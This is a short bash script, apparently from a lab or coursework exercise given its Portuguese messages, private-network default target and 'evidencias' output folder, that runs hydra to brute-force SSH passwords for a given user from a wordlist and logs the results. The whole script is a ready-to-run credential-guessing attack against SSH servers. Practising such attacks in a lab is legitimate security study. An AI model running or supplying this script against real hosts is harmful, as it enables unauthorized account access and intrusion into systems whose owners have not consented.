#!/usr/bin/env bash
set -euo pipefail
# scripts/ssh_bruteforce.sh

TARGET=${1:-192.168.56.101}
USER=${2:-linuxmint}
WL=${3:-/home/$(whoami)/passwords_small.txt}
OUTDIR=${4:-/home/$(whoami)/evidencias}

mkdir -p "$OUTDIR"
echo "[*] Rodando hydra contra $TARGET (user $USER) com $WL"
hydra -l "$USER" -P "$WL" ssh://$TARGET -t 4 -vV | tee "$OUTDIR/hydra_output.txt"
echo "[*] Resultado salvo em $OUTDIR/hydra_output.txt"

